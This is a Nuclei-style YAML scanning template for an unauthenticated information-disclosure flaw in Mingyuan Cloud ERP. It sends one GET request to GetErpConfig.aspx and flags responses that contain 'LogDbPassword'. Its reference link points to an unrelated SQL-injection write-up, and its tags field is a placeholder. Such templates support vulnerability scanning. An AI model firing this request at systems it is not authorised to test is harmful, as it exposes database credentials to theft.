id: myerp-GetErpConfig-weak
info:
  name: 明源云GetErpConfig.aspx信息泄露漏洞
  author: wangzong
  severity: high
  description: 明源云ERP报表服务 GetErpConfig.aspx 接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取内部数据库敏感配置信息，导致系统处于极不安全的状态。
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%B8%8A%E6%B5%B7%E5%95%86%E5%88%9B/%E5%A4%A7%E5%95%86%E5%88%9B%E5%A4%9A%E7%94%A8%E6%88%B7%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9Fajax_dialog.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60"

    matchers:
      - type: word
        part: body
        words:
          - 'LogDbPassword'
